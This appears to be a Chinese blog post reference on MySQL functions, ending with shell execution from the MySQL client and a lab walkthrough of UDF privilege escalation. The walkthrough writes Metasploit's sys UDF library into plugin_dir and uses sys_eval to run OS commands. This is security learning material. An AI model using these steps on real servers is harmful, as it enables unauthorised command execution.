<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><blockquote>
<ul>
<li><code>binary value</code>，将值转换成二进制字符串，注意和 <code>bin()</code> 转换成二进制形式的数字表示不同。</li>
<li><code>cast(v as t)</code>，将值 v 转换成类型 t 表示</li>
<li><code>convert(v, t)</code> | <code>convert(v using charset)</code>，将值 v 转换成类型 t 表示，或 使用字符集 charset 表示</li>
</ul>
</blockquote>
<p><strong>可转换的数据类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">类型值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE</td>
<td align="left">格式: “YYYY-MM-DD”</td>
</tr>
<tr>
<td align="left">DATETIME</td>
<td align="left">格式: “YYYY-MM-DD HH:MM:SS”</td>
</tr>
<tr>
<td align="left">TIME</td>
<td align="left">格式: “HH:MM:SS”</td>
</tr>
<tr>
<td align="left">CHAR</td>
<td align="left">字符类型（固定长度的字符串）</td>
</tr>
<tr>
<td align="left">SIGNED</td>
<td align="left">64 位带符号整数</td>
</tr>
<tr>
<td align="left">UNSIGNED</td>
<td align="left">64位不带符号整数</td>
</tr>
<tr>
<td align="left">BINARY</td>
<td align="left">二进制字符串</td>
</tr>
</tbody></table>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#正常字符串，比较不分大小写，所以比较结果相同</span><br><span class="line">mysql&gt; select &quot;a&quot; = &quot;A&quot;; </span><br><span class="line">+-----------+</span><br><span class="line">| &quot;a&quot; = &quot;A&quot; |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line">#但二进制字符串中 &quot;a&quot; 和 &quot;A&quot; 是不同的</span><br><span class="line">mysql&gt; select binary &quot;a&quot; = binary &quot;A&quot;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| binary &quot;a&quot; = binary &quot;A&quot; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">#转换成类型 DATETIME</span><br><span class="line">mysql&gt; select cast(&quot;2019-08-23 15:59:59&quot; as datetime);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| cast(&quot;2019-08-23 15:59:59&quot; as datetime) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| 2019-08-23 15:59:59                     |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">#使用 gbk 字符集，表示中文</span><br><span class="line">mysql&gt; select convert(&quot;中国&quot; using gbk);</span><br><span class="line">mysql&gt; select convert(&quot;中国&quot; using utf8);</span><br><span class="line">+------------------------------+</span><br><span class="line">| convert(&quot;中国&quot; using utf8)   |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 中国                         |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="条件判断函数"><a href="#条件判断函数" class="headerlink" title="条件判断函数"></a>条件判断函数</h3><blockquote>
<ul>
<li><code>case</code>，返回第一个满足条件的值，语法<br><code>CASE</code><br>   <code>WHEN *condition1* THEN *result1*</code><br>   <code>WHEN *condition2* THEN *result2*</code><br>   <code>WHEN *conditionN* THEN *resultN*</code><br>   <code>ELSE *result*</code><br><code>END;</code></li>
<li><code>if(con, t, f)</code>，满足条件，执行 t 语句，反之，f 语句</li>
<li><code>ifnull(expr, v)</code>，如果 expr 表达式值为 NULL，返回 v</li>
<li><code>isnull(expr)</code>，判断 表达式 expr 值是否为 NULL，是返回 1，反之为 0</li>
<li><code>nullif(expr1, expr2)</code>，如何两个表达式值相同，返回 NULL，反之返回 expr1</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># case 语句</span><br><span class="line">mysql&gt; select id, name, case when id&gt;=1 and id&lt;3 then &quot;p1&quot; when id&gt;2 and id&lt;5 then &quot;p2&quot; else &quot;p3&quot; end as info  from test;</span><br><span class="line">+----+------+------+</span><br><span class="line">| id | name | info |</span><br><span class="line">+----+------+------+</span><br><span class="line">|  1 | May  | p1   |</span><br><span class="line">|  2 | June | p1   |</span><br><span class="line">|  3 | Hack | p2   |</span><br><span class="line">| 10 | Cook | p3   |</span><br><span class="line">+----+------+------+</span><br><span class="line"># if(con, t, f)</span><br><span class="line">mysql&gt; select *, if(id&gt;2, &quot;p1&quot;, &quot;p2&quot;) as part from test;</span><br><span class="line">+----+------+------+</span><br><span class="line">| id | name | part |</span><br><span class="line">+----+------+------+</span><br><span class="line">|  1 | May  | p2   |</span><br><span class="line">|  2 | June | p2   |</span><br><span class="line">|  3 | Hack | p1   |</span><br><span class="line">| 10 | Cook | p1   |</span><br><span class="line">+----+------+------+</span><br><span class="line"># ifnull(expr, v)</span><br><span class="line">mysql&gt; select ifnull(NULL, &quot;expr is null&quot;) as value;</span><br><span class="line">+--------------+</span><br><span class="line">| value        |</span><br><span class="line">+--------------+</span><br><span class="line">| expr is null |</span><br><span class="line">+--------------+</span><br><span class="line"># nullif(expr1, expr2)</span><br><span class="line">mysql&gt; select nullif(&quot;100&quot;, 100); #数字和字符一样</span><br><span class="line">+--------------------+</span><br><span class="line">| nullif(&quot;100&quot;, 100) |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line"># 不分大小写</span><br><span class="line">mysql&gt; select nullif(&quot;Case&quot;,&quot;cAse&quot; );</span><br><span class="line">+------------------------+</span><br><span class="line">| nullif(&quot;Case&quot;,&quot;cAse&quot; ) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL                   |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h3><blockquote>
<ul>
<li><code>current_user()</code>，MySQL 授权的用户名和主机名</li>
<li><code>user()</code> |  <code>session_user()</code> | <code>system_user()</code>，当前连接的用户名和主机名</li>
<li><code>database()</code>，当前数据库</li>
<li><code>connection_id()</code>，当前 连接的 ID</li>
<li><code>version()</code>，MySQL 版本号</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># current_user() 和 user()|session_user()| system_user() 的区别，只有一个用户名具有多个主机才有区别，如 username@%</span><br><span class="line"># 在服务器主机登陆，这四个都是一样的主机名 localhost</span><br><span class="line">mysql&gt; select  current_user(), user(), session_user(), system_user();</span><br><span class="line">+-------------------+-------------------+-------------------+-------------------+</span><br><span class="line">| current_user()    | user()            | session_user()    | system_user()     |</span><br><span class="line">+-------------------+-------------------+-------------------+-------------------+</span><br><span class="line">| user102@localhost | user102@localhost | user102@localhost | user102@localhost |</span><br><span class="line">+-------------------+-------------------+-------------------+-------------------+</span><br><span class="line"># 在客户端用进行远程登陆，主机名会改变</span><br><span class="line">mysql&gt; select  current_user(), user();</span><br><span class="line">+-------------------+----------------------+</span><br><span class="line">| current_user()    | user()               |</span><br><span class="line">+-------------------+----------------------+</span><br><span class="line">| user102@%         | user102@192.168.47.1 |</span><br><span class="line">+-------------------+----------------------+</span><br></pre></td></tr></table></figure>

<h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><blockquote>
<ul>
<li><code>hex(value)</code> | <code>unhex(value)</code>，转换成 16 进制的字符串表示，或从 16 进制字符串转回正常的字符串表示</li>
<li><code>to_base64(s)</code> | <code>from_base64(s)</code> ，转换成 base64 编码的字符串或者从 base64 编码的字符串转回正常的字符串表示</li>
<li><code>encode(s, p)</code> | <code>decode(s, p)</code>，将字符串 s 使用密码 p 进行 加解密</li>
<li><code>compress(s)</code> | <code>uncompress(s)</code> 压缩或解压 s</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select unhex(&apos;hhhh, who are you!&apos;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| unhex(&apos;hhhh, who are you!&apos;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| NULL                        |</span><br><span class="line">+-----------------------------+</span><br><span class="line">mysql&gt; select unhex(hex(&apos;hhhh, who are you!&apos;));</span><br><span class="line">+----------------------------------+</span><br><span class="line">| unhex(hex(&apos;hhhh, who are you!&apos;)) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| hhhh, who are you!               |</span><br><span class="line">+----------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select to_base64(&apos;hhhh, who are you!&apos;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| to_base64(&apos;hhhh, who are you!&apos;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| aGhoaCwgd2hvIGFyZSB5b3Uh        |</span><br><span class="line">+---------------------------------+</span><br><span class="line">mysql&gt; select from_base64(to_base64(&apos;hhhh, who are you!&apos;));</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| from_base64(to_base64(&apos;hhhh, who are you!&apos;)) |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| hhhh, who are you!                           |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line"># 加解密</span><br><span class="line">mysql&gt; select decode(encode(&apos;string&apos;, &apos;hhh&apos;), &apos;hhh&apos;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| decode(encode(&apos;string&apos;, &apos;hhh&apos;), &apos;hhh&apos;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| string                                 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line"># 压缩和解压</span><br><span class="line">mysql&gt; select uncompress(compress(&quot;What the hell!&quot;));</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| uncompress(compress(&quot;What the hell!&quot;)) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What the hell!                         |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="其它函数-1"><a href="#其它函数-1" class="headerlink" title="其它函数"></a>其它函数</h3><blockquote>
<ul>
<li><code>coalesce(v1, v2, ...)</code>，返回列表中第一个非 NULL 值</li>
<li><code>last_insert_id([expr])</code>，返回当表中 最新行的 AUTO_INCREMENT 属性的 id 值</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select coalesce(null, &quot;not null&quot;, 3);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| coalesce(null, &quot;not null&quot;, 3) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| not null                      |</span><br><span class="line">+-------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select last_insert_id();</span><br><span class="line">+------------------+</span><br><span class="line">| last_insert_id() |</span><br><span class="line">+------------------+</span><br><span class="line">|               10 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>

<h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><p>MySQL 中关于日期的函数特别多，好像在 SQL 注入过程中不常用到，还是稍微总结下。</p>
<h3 id="当前日期和时间"><a href="#当前日期和时间" class="headerlink" title="当前日期和时间"></a>当前日期和时间</h3><p>MySQL 中日期表示的格式为  “YYYY-MM-DD”，时间表示的格式为 “HH-MM-SS”，日期和时间一起表示为 “YYYY-MM-DD HH-MM-SS”。</p>
<blockquote>
<ul>
<li><p><code>curdate()</code> | <code>current_date()</code>，返回 “YYYY-MM-DD”格式的字符串  或者YYYYMMDD 格式的数字</p>
</li>
<li><p><code>curtime()</code> | <code>current_time()</code>，返回 “HH-MM-SS” 格式的字符串 或者 HHMMSS.uuuuuu 格式的数字</p>
</li>
<li><p><code>current_timestamp()</code> | <code>now()</code> | <code>systdate()</code>，返回当前日期和时间，格式不变</p>
</li>
<li><p><code>localtime()</code> | <code>local_timestamp()</code>，返回当前日期和时间，格式不变</p>
</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select current_date(), curdate();</span><br><span class="line">+----------------+------------+</span><br><span class="line">| current_date() | curdate()  |</span><br><span class="line">+----------------+------------+</span><br><span class="line">| 2019-08-24     | 2019-08-24 |</span><br><span class="line">+----------------+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select current_time(), curtime();</span><br><span class="line">+----------------+-----------+</span><br><span class="line">| current_time() | curtime() |</span><br><span class="line">+----------------+-----------+</span><br><span class="line">| 07:38:16       | 07:38:16  |</span><br><span class="line">+----------------+-----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select current_timestamp(), now(), sysdate();</span><br><span class="line">+---------------------+---------------------+---------------------+</span><br><span class="line">| current_timestamp() | now()               | sysdate()           |</span><br><span class="line">+---------------------+---------------------+---------------------+</span><br><span class="line">| 2019-08-24 07:40:04 | 2019-08-24 07:40:04 | 2019-08-24 07:40:04 |</span><br><span class="line">+---------------------+---------------------+---------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select localtime(), localtimestamp();</span><br><span class="line">+---------------------+---------------------+</span><br><span class="line">| localtime()         | localtimestamp()    |</span><br><span class="line">+---------------------+---------------------+</span><br><span class="line">| 2019-08-24 07:40:49 | 2019-08-24 07:40:49 |</span><br><span class="line">+---------------------+---------------------+</span><br></pre></td></tr></table></figure>

<h1 id="MySQL-执行系统命令"><a href="#MySQL-执行系统命令" class="headerlink" title="MySQL 执行系统命令"></a>MySQL 执行系统命令</h1><h2 id="使用-system-shell-cmd"><a href="#使用-system-shell-cmd" class="headerlink" title="使用 system shell-cmd"></a>使用 <code>system shell-cmd</code></h2><p>在 MySQL 的命令行界面中可以使用   <code>system shell-cmd</code> 或者<code>\! shell-cmd</code> 格式执行 shell 命令。</p>
<p><strong>实例：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> \! <span class="built_in">pwd</span>  <span class="comment"># 显示当前目录</span></span></span><br><span class="line">/home/jaylen</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> \! ls <span class="comment"># 当前目录内容</span></span></span><br><span class="line">Desktop    Downloads	     less   Pictures  Templates  Videos</span><br><span class="line">Documents  examples.desktop  Music  Public    test.txt	 work</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> \! cat ./work/<span class="built_in">test</span>  <span class="comment"># 使用 cat 查看文件内容</span></span></span><br><span class="line">1	jack</span><br><span class="line">2	jackit</span><br></pre></td></tr></table></figure>

<p>也可以打开一个新的 shell，关闭 shell (使用 exit 或者 CTRL D)后返回 MySQL 命令行界面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \! bash  # 打开终端</span><br><span class="line">jaylen@ubuntu:~$ cd work/  # 返回到 设立了</span><br><span class="line">jaylen@ubuntu:~/work$ ls</span><br><span class="line">DVWA  hashcat-5.1.0  neo  suctf  test  test.csv</span><br><span class="line">jaylen@ubuntu:~/work$ eixt</span><br><span class="line">eixt: command not found</span><br><span class="line">jaylen@ubuntu:~/work$ exit # 关闭 shell</span><br><span class="line">exit</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<h1 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL UDF 提权"></a>MySQL UDF 提权</h1><h2 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h2><p>UDF 为 “User-Defined Function” 的所写，即用户自定义函数。MySQL 允许用户添加新的函数，其中一种方法就是通过其提供的 UDF 接口，添加用户自定义函数。用户自定义函数可以使用 C/C++ 语言编写并编译成库文件（其它语言也可以，只要能编译成共享库文件），放到 MySQL 指定的目录下，以便 MySQL 能动态加载用户自定义的函数。</p>
<p>使用 UDF 可以加载自定义的函数，因此可以通过自定义函数执行各种操作，关于用户自定义函数的编写可参考，<a href="https://docstore.mik.ua/orelly/weblinux2/mysql/ch14_01.htm" target="_blank" rel="noopener">Extending MySQL</a></p>
<h2 id="使用-UDF"><a href="#使用-UDF" class="headerlink" title="使用 UDF"></a>使用 UDF</h2><p>那么如何使用 UDF 进行提权呢？</p>
<p><strong>前提条件：</strong></p>
<ol>
<li><p>MySQL 用户能写文件到 MySQL 指定的自定义函数库存放目录。</p>
</li>
<li><p>MySQL 用户具有 <code>INSERT</code> 权限，才能使用 <code>CREATE FUNCTION</code>语句在 MySQL 中添加自定义的函数，此外如果使用 <code>DROP FUNCTION</code> 语句删除自定义函数，还需要有 <code>DELETE</code> 权限。</p>
</li>
</ol>
<p><strong>实验环境：</strong></p>
<ul>
<li>攻击主机：Kali Linux</li>
<li>MySQL 服务器主机：<a href="https://sourceforge.net/projects/owaspbwa/files/1.2/" target="_blank" rel="noopener">owaspbwa</a></li>
</ul>
<p><strong>步骤：</strong></p>
<ol>
<li>根据目标系统（MySQL服务器主机）的类型，准备好相应的可加载的库文件，网上有不少 UDF 的库文件，这里使用 Metasploit 自带的 UDF 库，Kali 主机上 <code>find / -name &#39;*mysqludf*&#39;</code> 进行搜索，可以看到可用的库文件，<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank" rel="noopener">GitHub上也有</a>，这里根据系统类型使用 <code>lib_mysqludf_sys_32.so</code>。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看系统类型</span><br><span class="line">MySQL [pwn]&gt; show variables like &quot;%compile%&quot;;</span><br><span class="line">+-------------------------+------------------+</span><br><span class="line">| Variable_name           | Value            |</span><br><span class="line">+-------------------------+------------------+</span><br><span class="line">| version_compile_machine | i486             |</span><br><span class="line">| version_compile_os      | debian-linux-gnu |</span><br><span class="line">+-------------------------+------------------+</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>将自定义函数的库文件放到 MySQL 指定的文件目录下，这个文件目录和 MySQL 的版本相关。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># MySQL 版本 &lt; 5.0.67, 放在能别系统的链接器检索的文件夹即可，通常系统目录都是行的，如在 Windows中，C:\\WINDOWS\\ 或者 C:\\WINDOWS\\system32\\</span><br><span class="line"># MySQL 版本 &gt;= 5.0.67, 指定在 plugin_dir 目录下</span><br><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+------------------------+</span><br><span class="line">| @@plugin_dir           |</span><br><span class="line">+------------------------+</span><br><span class="line">| /usr/lib/mysql/plugin/ |</span><br><span class="line">+------------------------+</span><br><span class="line"># 将 UDF 库文件写到 plugin_dir 目录中,前提是可以写文件到 plugin_dir 目录中</span><br><span class="line"># 将 库文件转换成 16进制字符存储，而后写入到表中，最终存到 plugin_dir 目录中，</span><br><span class="line"># Kali Linux 上的 MySQL</span><br><span class="line">MariaDB [(none)]&gt; select hex(load_file(&apos;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so&apos;)) into dumpfile &apos;/tmp/udf.hex&apos;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"># 远程登陆的 MySQL，从 Kali Linux上传，使用 local 关键字</span><br><span class="line">MySQL [pwn]&gt; load data local infile &apos;/tmp/udf.hex&apos; into table udf(data);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Records: 1  Deleted: 0  Skipped: 0  Warnings: 0</span><br><span class="line"># 将自定义库存到指定目录</span><br><span class="line">MySQL [pwn]&gt; select unhex(data) from udf into dumpfile &apos;/usr/lib/mysql/plugin/udf.so&apos;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>在 MySQL 命令行中加载自定义函数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 创建自定义函数</span><br><span class="line">MySQL [pwn]&gt; create function sys_eval returns string soname &apos;udf.so&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"># 使用</span><br><span class="line">MySQL [pwn]&gt; select sys_eval(&apos;ls /&apos;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| sys_eval(&apos;ls /&apos;)                                                                                                                                           |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| bin</span><br><span class="line">boot</span><br><span class="line">cdrom</span><br><span class="line">dev</span><br><span class="line">etc</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>从 MySQL 中删除自定义函数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 删除函数</span><br><span class="line">MySQL [pwn]&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><p><a href="https://www.w3schools.com/sql/sql_ref_mysql.asp" target="_blank" rel="noopener">MySQL Functions</a></p>
</li>
<li><p><a href="https://www.runoob.com/mysql/mysql-functions.html" target="_blank" rel="noopener">MySQL 函数 | 菜鸟教程</a></p>
</li>
<li><p><a href="https://www.electrictoolbox.com/shell-commands-mysql-command-line-client/" target="_blank" rel="noopener">Executing shell commands from within the MySQL command line client</a></p>
</li>
<li><p><a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/#more-2703" target="_blank" rel="noopener">MySQL UDF Exploitation</a></p>
</li>
<li><p><a href="https://dev.mysql.com/doc/refman/8.0/en/adding-functions.html" target="_blank" rel="noopener">Adding New Functions to MySQL</a></p>
</li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">BingSlient</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://bingslient.github.io/2019/08/26/MySQL 函数及其利用/">https://bingslient.github.io/2019/08/26/MySQL 函数及其利用/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://bingslient.github.io">BingSlient's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MySQL/">MySQL    </a><a class="post-meta__tags" href="/tags/MySQL-函数/">MySQL 函数    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-buttom"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" data-src="/img/wechat.jpg"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" data-src="/img/alipay.jpg"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2019/08/16/Kali linux 使用国内源/"><img class="next_cover lozad" data-src="https://cdn.jsdelivr.net/gh/BingSlient/cdn/cover/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>Kali Linux 使用国内源</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span>相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/08/16/MySQL 数据库系统表的利用/" title="MySQL 数据库系统表的利用"><img class="relatedPosts_cover lozad" data-src="https://cdn.jsdelivr.net/gh/BingSlient/cdn/cover/default_cover.jpg"><div class="relatedPosts_title">MySQL 数据库系统表的利用</div></a></div><div class="relatedPosts_item"><a href="/2019/08/09/关系数据库管理基础/" title="关系数据库管理基础"><img class="relatedPosts_cover lozad" data-src="https://cdn.jsdelivr.net/gh/BingSlient/cdn/cover/rdbms.jpg"><div class="relatedPosts_title">关系数据库管理基础</div></a></div></div><div class="clear_both"></div></div></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 By BingSlient</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a 